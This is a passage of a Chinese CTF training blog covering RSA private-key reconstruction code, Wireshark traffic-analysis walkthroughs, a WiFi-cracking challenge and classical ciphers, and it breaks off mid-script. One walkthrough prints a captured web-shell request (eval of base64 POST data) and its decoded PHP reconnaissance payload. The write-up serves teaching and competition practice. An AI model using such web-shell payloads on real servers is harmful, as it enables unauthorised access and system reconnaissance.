class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> base64, fractions, optparse, random</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1.type.univ <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">PEM_TEMPLATE = <span class="string">'-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n'</span></span><br><span class="line">DEFAULT_EXP = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span><span class="params">(n, d, e)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        quotient, remainder = divmod(t, <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"> </span><br><span class="line">    found = <span class="keyword">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = pow(a, pow(<span class="number">2</span>, i<span class="number">-1</span>, n) * t, n)</span><br><span class="line">            c2 = pow(a, pow(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"> </span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (<span class="number">-1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    p = fractions.gcd(c1<span class="number">-1</span>, n)</span><br><span class="line">    q = (n / p)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, p=None, q=None, n=None, d=None, e=DEFAULT_EXP)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Initialize RSA instance using primes (p, q)</span></span><br><span class="line"><span class="string">        or modulus and private exponent (n, d)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"> </span><br><span class="line">        self.e = e</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">and</span> q:</span><br><span class="line">            <span class="keyword">assert</span> gmpy.is_prime(p), <span class="string">'p is not prime'</span></span><br><span class="line">            <span class="keyword">assert</span> gmpy.is_prime(q), <span class="string">'q is not prime'</span></span><br><span class="line"> </span><br><span class="line">            self.p = p</span><br><span class="line">            self.q = q</span><br><span class="line">        <span class="keyword">elif</span> n <span class="keyword">and</span> d:   </span><br><span class="line">            self.p, self.q = factor_modulus(n, d, e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ArgumentError(<span class="string">'Either (p, q) or (n, d) must be provided'</span>)</span><br><span class="line"> </span><br><span class="line">        self._calc_values()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_calc_values</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line"> </span><br><span class="line">        phi = (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>)</span><br><span class="line">        self.d = gmpy.invert(self.e, phi)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># CRT-RSA precomputation</span></span><br><span class="line">        self.dP = self.d % (self.p - <span class="number">1</span>)</span><br><span class="line">        self.dQ = self.d % (self.q - <span class="number">1</span>)</span><br><span class="line">        self.qInv = gmpy.invert(self.q, self.p)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_pem</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return OpenSSL-compatible PEM encoded key</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> PEM_TEMPLATE % base64.encodestring(self.to_der())</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_der</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Return parameters as OpenSSL compatible DER encoded key</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        seq = Sequence()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, self.n, self.e, self.d, self.p, self.q, self.dP, self.dQ, self.qInv]:</span><br><span class="line">            seq.setComponentByPosition(len(seq), Integer(x))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> encoder.encode(seq)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(self, verbose)</span>:</span></span><br><span class="line">        vars = [<span class="string">'n'</span>, <span class="string">'e'</span>, <span class="string">'d'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            vars += [<span class="string">'dP'</span>, <span class="string">'dQ'</span>, <span class="string">'qInv'</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> vars:</span><br><span class="line">            self._dumpvar(v)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_dumpvar</span><span class="params">(self, var)</span>:</span></span><br><span class="line">        val = getattr(self, var)</span><br><span class="line"> </span><br><span class="line">        parts = <span class="keyword">lambda</span> s, l: <span class="string">'\n'</span>.join([s[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), l)])</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> len(str(val)) &lt;= <span class="number">40</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%s = %d (%#x)\n'</span> % (var, val, val)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%s ='</span> % var</span><br><span class="line">            <span class="keyword">print</span> parts(<span class="string">'%x'</span> % val, <span class="number">80</span>) + <span class="string">'\n'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line"> </span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'p'</span>, help=<span class="string">'prime'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-q'</span>, dest=<span class="string">'q'</span>, help=<span class="string">'prime'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-n'</span>, dest=<span class="string">'n'</span>, help=<span class="string">'modulus'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-d'</span>, dest=<span class="string">'d'</span>, help=<span class="string">'private exponent'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-e'</span>, dest=<span class="string">'e'</span>, help=<span class="string">'public exponent (default: %d)'</span> % DEFAULT_EXP, type=<span class="string">'int'</span>, default=DEFAULT_EXP)</span><br><span class="line">    parser.add_option(<span class="string">'-o'</span>, dest=<span class="string">'filename'</span>, help=<span class="string">'output filname'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>, dest=<span class="string">'format'</span>, help=<span class="string">'output format (DER, PEM) (default: PEM)'</span>, type=<span class="string">'choice'</span>, choices=[<span class="string">'DER'</span>, <span class="string">'PEM'</span>], default=<span class="string">'PEM'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-v'</span>, dest=<span class="string">'verbose'</span>, help=<span class="string">'also display CRT-RSA representation'</span>, action=<span class="string">'store_true'</span>, default=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (options, args) = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> options.p <span class="keyword">and</span> options.q:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Using (p, q) to initialise RSA instance\n'</span></span><br><span class="line">            rsa = RSA(p=options.p, q=options.q, e=options.e)</span><br><span class="line">        <span class="keyword">elif</span> options.n <span class="keyword">and</span> options.d:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Using (n, d) to initialise RSA instance\n'</span></span><br><span class="line">            rsa = RSA(n=options.n, d=options.d, e=options.e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br><span class="line">            parser.error(<span class="string">'Either (p, q) or (n, d) needs to be specified'</span>)</span><br><span class="line"> </span><br><span class="line">        rsa.dump(options.verbose)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> options.filename:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Saving %s as %s'</span> % (options.format, options.filename)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> options.format == <span class="string">'PEM'</span>:</span><br><span class="line">                data = rsa.to_pem()</span><br><span class="line">            <span class="keyword">elif</span> options.format == <span class="string">'DER'</span>:</span><br><span class="line">                data = rsa.to_der()</span><br><span class="line"> </span><br><span class="line">            fp = open(options.filename, <span class="string">'wb'</span>)</span><br><span class="line">            fp.write(data)</span><br><span class="line">            fp.close()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">except</span> optparse.OptionValueError, e:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        parser.error(e.msg)</span><br></pre></td></tr></table></figure></li></ul><h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p>1.CTFwiki–<a href="https://wiki.x10sec.org/crypto/introduction/" rel="external nofollow" target="_blank">密码学部分</a></p><p>2.RSA介绍–<a href="https://www.jianshu.com/p/0c4943d7ea2d" rel="external nofollow" target="_blank">总结</a></p><h2 id="day02–Danie1"><a href="#day02–Danie1" class="headerlink" title="day02–Danie1"></a>day02–Danie1</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><hr><p>在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，参赛选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索。 </p><p>pcap流量包的分析通常都是通过图形化的网络嗅探器——wireshark进行的，这款嗅探器经过众多开发者的不断完善，现在已经成为使用最为广泛的安全工具之一。</p><p>Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。</p><h3 id="经典题型"><a href="#经典题型" class="headerlink" title="经典题型"></a>经典题型</h3><ul><li>CTF题型主要分为流量包修复、WEB流量包分析、USB流量包分析和其他流量包分析。</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul><li><p>流量包修复</p><p>比赛中可能会出现通过wireshark打开题目给的流量包后提示包异常的情况，如图</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080601.png" alt=""></p></li><li><p>思路</p><ul><li>在线修复网站：<a href="http://f00l.de/hacking/pcapfix.php" rel="external nofollow" target="_blank">http://f00l.de/hacking/pcapfix.php</a></li></ul></li><li><p>题目</p><p>第一届 “百度杯” 信息安全攻防总决赛 线上选拔赛：find the flag</p><p>pacp文件地址：<a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap" rel="external nofollow" target="_blank">https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap</a></p></li><li><p>解题思路：</p><ul><li><p>在线修复，修复完毕后用wireshark打开，查找分组字节流-字符串-flag</p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080602.png" alt=""></p></li></ul></li></ul><ul><li><p>看到where is the flag？继续查看下一个数据包</p></li><li><p>发现两个包id对应的字段刚好是flag</p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080603.png" alt=""></p></li></ul><ul><li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080604.png" alt=""></li></ul><ul><li><p>按照同样的方式连接后面相连数据包的id字段，找到最终的flag</p><p><code>flag{aha!_you_found_it!}</code></p></li></ul><ul><li><p>基本的流量包分析</p></li><li><p>question</p><p>题目  test3.pcapng</p></li><li><p>question</p><p>题目 test.pcapng</p></li><li><p>question</p><p>题目链接：链接: <a href="https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg" rel="external nofollow" target="_blank">https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg</a>  密码: l43q</p></li></ul><p>  解题思路：wireshark打开流量包</p><p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080605.png" alt=""></p><p>  可以看到User和pass，且都是base64编码</p><p>  解码可以得到</p><p>  user:<a href="mailto:test@51elab.com" rel="external nofollow" target="_blank">test@51elab.com</a></p><p>  passwd:FLAG:ISCCTESTpas</p><ul><li><p>question</p><p>题目链接：链接: <a href="https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg" rel="external nofollow" target="_blank">https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg</a>  密码: 9r2i</p></li></ul><p>​      解题思路：wireshark打开流量包，追踪tcp流，在第二个流中发现flag</p><p>​         <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080606.png" alt=""></p><ul><li><p>question</p><p>题目链接：链接: <a href="https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A" rel="external nofollow" target="_blank">https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A</a>  密码: wk6w</p></li></ul><p>  解题思路：wireshark打开流量包，过滤显示http协议包</p><p> <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080607.png" alt=""></p><p>  发现不停的向一个目录post数据，猜测有人在上传一句话</p><p>  追踪tcp流，发现</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure><p>  先进行url解码，再进行base64解码，得到</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">  </span><br><span class="line">@ini_set(“display_errors”,”0″);</span><br><span class="line">  </span><br><span class="line">@set_time_limit(0);</span><br><span class="line">  </span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">  </span><br><span class="line">echo(“-&gt;|”);;</span><br><span class="line">  </span><br><span class="line">$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">  </span><br><span class="line">if($D==”&quot;)</span><br><span class="line">  </span><br><span class="line">    $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">  </span><br><span class="line">$R=”&#123;$D&#125;\t”;</span><br><span class="line">  </span><br><span class="line">if(substr($D,0,1)!=”/”)</span><br><span class="line">  </span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">    foreach(range(“A”,”Z”) as $L)</span><br><span class="line">  </span><br><span class="line">        if(is_dir(“&#123;$L&#125;:”))</span><br><span class="line">  </span><br><span class="line">            $R.=”&#123;$L&#125;:”;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">$R.=”\t”;</span><br><span class="line">  </span><br><span class="line">$u=(function_exists(‘posix_getegid’))?@posix_getpwuid(@posix_geteuid()):”;</span><br><span class="line">  </span><br><span class="line">$usr=($u)?$u[&apos;name&apos;]:@get_current_user();</span><br><span class="line">  </span><br><span class="line">$R.=php_uname();</span><br><span class="line">  </span><br><span class="line">$R.=”(&#123;$usr&#125;)”;</span><br><span class="line">  </span><br><span class="line">print $R;;</span><br><span class="line">  </span><br><span class="line">echo(“|&lt;-”);</span><br><span class="line">  </span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>  在tcp stream 5发现一个压缩包，下载</p><p>  在tcp stream 6发现png文件头89504E47</p><p>  保存为一张png图片</p><ul><li><p>question</p><p>破解wifi密码（文件wifi.cap）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;你破解的WiFi密码&#125;</span><br><span class="line"></span><br><span class="line">tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你</span><br><span class="line">1391040**</span><br><span class="line">Goodluck!!</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080608.png" alt=""></p></li></ul><p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080609.png" alt=""></p><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><hr><p><a href="https://blog.csdn.net/qq_41187256/article/details/79693012" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_41187256/article/details/79693012</a></p><ul><li><p>栅栏密码</p><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话</p><p>明文：THERE IS A CIPHER<br>去掉空格后变为：THEREISACIPHER<br>两个一组，得到：TH ER EI SA CI PH ER<br>先取出第一个字母：TEESCPE<br> 再取出第二个字母：HRIAIHR<br>连在一起就是：TEESCPEHRIAIHR<br>还原为所需密码。<br>而解密的时候，我们先把密文从中间分开，变为两行：<br>T E E S C P E<br>H R I A I H R<br>再按上下上下的顺序组合起来：<br>THEREISACIPHER<br>分出空格，就可以得到原文了：<br>THERE IS A CIPHER</p></li><li><p>Brainfuck/Ook!编码</p></li><li><p><a href="https://tool.bugku.com/brainfuck/" rel="external nofollow" target="_blank">https://tool.bugku.com/brainfuck/</a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure><ul><li><p>培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：<br>第一种方式：<br>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab<br>K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb Y bbaaa Z bbaab<br>第二种方式<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA</p><p>f AABAB m ABABB s BAAAB z BABBB</p></li></ul><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baabbaabaabaaaababbaaabbaabbababbabaaabb</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/xuqi7/article/details/52261291" rel="external nofollow" target="_blank">脚本工具</a></p><ul><li><p>caesar（凯撒）</p><p>使用python pycipher库</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080610.png" alt=""></p></li></ul><ul><li><p>RSA算法(非对称密码)</p><p>加密过程  选择两个大素数p和q，计算出模数N = p * q </p><p>计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质</p><p> 取e的模反数为d，计算方法: e * d ≡ 1 (mod φ) </p><p>对明文m进行加密：c≡m^e (mod n) 或 c = pow(m,e,n)，得到的B即为密文 </p><p>对密文c进行解密，m≡c^d( mod n) 或 m = pow(c,d,n)，得到的A即为明文</p><p> p 和 q ：大整数N的两个因子（factor）</p><p> N：大整数N，我们称之为模数（modulus）</p><p> e 和 d：互为模反数的两个指数（exponent）</p><p> c 和 m：分别是密文和明文，这里一般指的是一个十进制的数</p><p>一般有如下称呼：</p><p>（N，e）：公钥</p><p>（N，d）：私钥</p><p>分解N可以在线factordb.com</p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_n</span><span class="params">(n)</span>:</span>   <span class="comment">#分解n</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = int(n/i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">n=<span class="number">2135733555619387051</span></span><br><span class="line">c=<span class="number">781391873123526159</span></span><br><span class="line">p,q=split_n(n)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">'c:%d'</span>%c)</span><br><span 